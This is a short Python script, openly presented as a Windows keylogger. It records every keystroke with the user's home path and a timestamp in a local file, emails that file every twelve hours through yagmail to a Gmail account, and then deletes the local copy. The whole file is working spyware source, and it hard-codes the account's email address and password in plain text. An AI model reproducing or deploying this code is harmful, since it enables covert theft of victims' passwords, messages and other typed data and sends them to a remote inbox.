###################################
# Keylogger to be used in Windows #
###################################
from pynput.keyboard import Key, Listener
import pynput
from datetime import datetime
import os
import yagmail
from apscheduler.schedulers.blocking import BlockingScheduler
from multiprocessing import Process

############
# Keylogger function
# You can change the directory and/or name of the log "keylog.txt"
# If no directory is entered but only file name, it saves where the keylogger is
# Only emits new line/linebreak when user presses enter or Tab
# Uses file write to insert into log, listener from pynput to grab keystrokes
############
def Klogger():

    log = os.environ.get(
        'pylogger_file',
        os.path.expanduser('keylog.txt') #Directory of log file
    )

    user = os.path.expanduser("~")
    timi = datetime.now()

    with open (log, 'a') as f:
        f.write(str(user) + '\n' + str(timi) + '\n')

    def on_press(key):
        with open(log, 'a') as f:
            if(key == Key.enter or key == Key.tab):
                f.write('{}\n'.format(key))
            else:
                f.write('{} - '.format(key))


    with Listener(on_press=on_press) as listener:
        listener.join()

###############
# Function using yagmail to send the log file
# This email is open to testing purposes for the next 2 weeks
###############
def sendLog(log):
    sender_email = "kloggertest42069@gmail.com" #Insert your email here
    receiver_email = "kloggertest42069@gmail.com" #and here
    subject = "Klogger"
    sender_password = "rotkiv1234" #email password here

    yag = yagmail.SMTP(user=sender_email, password=sender_password)

    contents = [
    "Klogger of the day"
    ]


    yag.send(receiver_email, subject, contents, attachments=log )

################
# Function to schedule email
# Can set different intervals for testing purposes
# f.x "seconds = 30" to set the interval to 30 seconds
# After sending the log, deletes the log and we start a new one
################
def mailInterval():
    sched = BlockingScheduler()
    @sched.scheduled_job('interval', hours=12)
    def timed_job():
        homedir = "keylog.txt"
        sendLog(homedir)
        os.remove(homedir)
    sched.start()

#################
# Multi processing to run functions in parallel
# Runs the actual Keylogger in process 1
# Runs the scheduler and mail in process 2
# WARNING : Altering this will break the program
#################
if __name__ == '__main__':
    p1 = Process(target=Klogger)
    p1.start()
    p2 = Process(target=mailInterval)
    p2.start()
    p1.join()
    p2.join()
